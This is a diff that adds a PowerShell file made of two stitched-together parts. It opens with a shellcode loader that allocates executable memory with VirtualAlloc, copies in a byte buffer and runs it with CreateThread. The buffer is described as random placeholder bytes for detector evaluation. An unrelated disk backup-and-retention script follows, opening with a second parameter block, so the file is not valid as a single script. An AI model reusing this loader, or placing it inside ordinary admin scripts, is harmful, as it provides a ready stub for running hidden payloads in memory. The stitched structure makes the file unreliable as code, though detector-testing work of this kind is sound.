@@ -1,0 +1,140 @@
+
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class Win32Api
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0x75, 0xe6, 0xcc, 0x1d, 0x4c, 0xc4, 0x32, 0x1a, 0x7b, 0x34, 0x82, 0x42, 0x8b, 0xde, 0x19, 0x8a,
+    0xda, 0x5b, 0x52, 0x8a, 0xda, 0xff, 0xbc, 0xc9, 0xd9, 0x34, 0x16, 0xea, 0x01, 0x8d, 0xd2, 0x45,
+    0xbe, 0x41, 0x72, 0xa0, 0x87, 0x01, 0xa8, 0x39, 0x80, 0x41, 0x12, 0x1b, 0x5c, 0x13, 0xcc, 0x24,
+    0x1a, 0xb2, 0xa0, 0x76, 0x4f, 0x41, 0x02, 0xaa, 0x8e, 0xd5, 0x6c, 0x9d, 0x47, 0xa4, 0x59, 0xff,
+    0xd8, 0xdf, 0xe6, 0xaa, 0xcb, 0x7c, 0x5b, 0x67, 0xc1, 0x6b, 0x44, 0xc5, 0xd0, 0xb1, 0xc0, 0xb8,
+    0xb1, 0x6b, 0xb0, 0xdc, 0x1b, 0xa8, 0xc2, 0xda, 0xc7, 0xbf, 0xfd, 0x93, 0x6d, 0x82, 0x9e, 0xb2,
+    0x05, 0x4b, 0x9a, 0xcb, 0x85, 0xcc, 0x74, 0x62, 0x58, 0xb0, 0xc8, 0x4d, 0xe9, 0x7d, 0x25, 0xf6,
+    0x96, 0xbe, 0x25, 0x56, 0x78, 0x7e, 0x17, 0x44, 0x0d, 0x60, 0xf0, 0x23, 0x21, 0xc1, 0x42, 0x29,
+    0x10, 0x00, 0x0d, 0x71, 0x82, 0xb4, 0x5e, 0x95, 0xb7, 0x81, 0xdb, 0x64, 0x7a, 0x10, 0x18, 0x14,
+    0xb6, 0xc9, 0x7b, 0xf6, 0x2f, 0xb0, 0xd6, 0xc2, 0x94, 0x02, 0x20, 0xdf, 0xb2, 0xbf, 0x3a, 0x7b,
+    0xdc, 0x96, 0xfb, 0xb1, 0x5f, 0x0c, 0xbc, 0x70, 0xb0, 0xd5, 0x7f, 0x2c, 0xcc, 0x27, 0x61, 0x67,
+    0x11, 0x48, 0x42, 0x63, 0x3c, 0x4b, 0x06, 0x63, 0x43, 0xec, 0xf0, 0xdf, 0x0e, 0x35, 0xa3, 0x49,
+    0x24, 0xc6, 0x5a, 0xeb, 0x0b, 0x82, 0xaa, 0xb9, 0xab, 0xd1, 0xdb, 0x60, 0x69, 0x10, 0xaa, 0x24,
+    0xbd, 0x12, 0x98, 0xc7, 0x9b, 0x76, 0xf3, 0xc6, 0xef, 0xe8, 0x61, 0xd8, 0xed, 0x9d, 0xba, 0x3b,
+    0xda, 0x4d, 0xcb, 0x3d, 0xbb, 0x00, 0x22, 0x8e, 0x4d, 0x1b, 0xbb, 0xed, 0xf2, 0x06
+)
+
+$BufferAddress = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($BufferAddress -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
+$ThreadId = 0
+$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][Win32Api]::WaitForSingleObject($Thread, 1855)
+[void][Win32Api]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+[CmdletBinding()]
+param(
+    [string]$SourcePath = "E:\Services\Adatum.Reporting",
+    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
+    [string]$BackupRoot = "E:\Backups\Reporting",
+    [Parameter(Mandatory = $false)]
+    [ValidateRange(1, 365)]
+    [int]$RetentionDays = 14,
+    [ValidateSet('Optimal', "Fastest", "NoCompression")]
+    [string]$CompressionLevel = 'Optimal',
+    [int]$MinFreeGB = 10,
+
+    [switch]$DryRun
+)
+
+
+New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
+
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
+New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
+Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force
+
+$item = Get-Item -LiteralPath $archive
+$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
+$manifest = [pscustomobject]@{
+    Archive   = $archive
+    SizeMB    = [math]::Round($item.Length / 1MB, 2)
+    SHA256    = $hash.Hash
+    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+    Source    = $SourcePath
+}
+
+$manifest | ConvertTo-Json -Depth 4 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8
+
+$cutoff = (Get-Date).AddDays(-$RetentionDays)
+$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
+    Where-Object { $_.LastWriteTime -lt $cutoff }
+foreach ($zip in $expired) {
+    Write-Host ("Expired: {0}" -f $zip.Name)
+    if ($DryRun) {
+        Write-Host ("Would remove {0}" -f $zip.FullName)
+        continue
+    }
+    Remove-Item -LiteralPath $zip.FullName -Force
+}
+
+$driveLetter = $BackupRoot.Substring(0, 1)
+$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
+if ($drive) {
+    $freeGB = [math]::Round($drive.Free / 1GB, 1)
+    if ($freeGB -lt $MinFreeGB) {
+        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
+    }
+}
+
+Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
+$manifest | Format-List
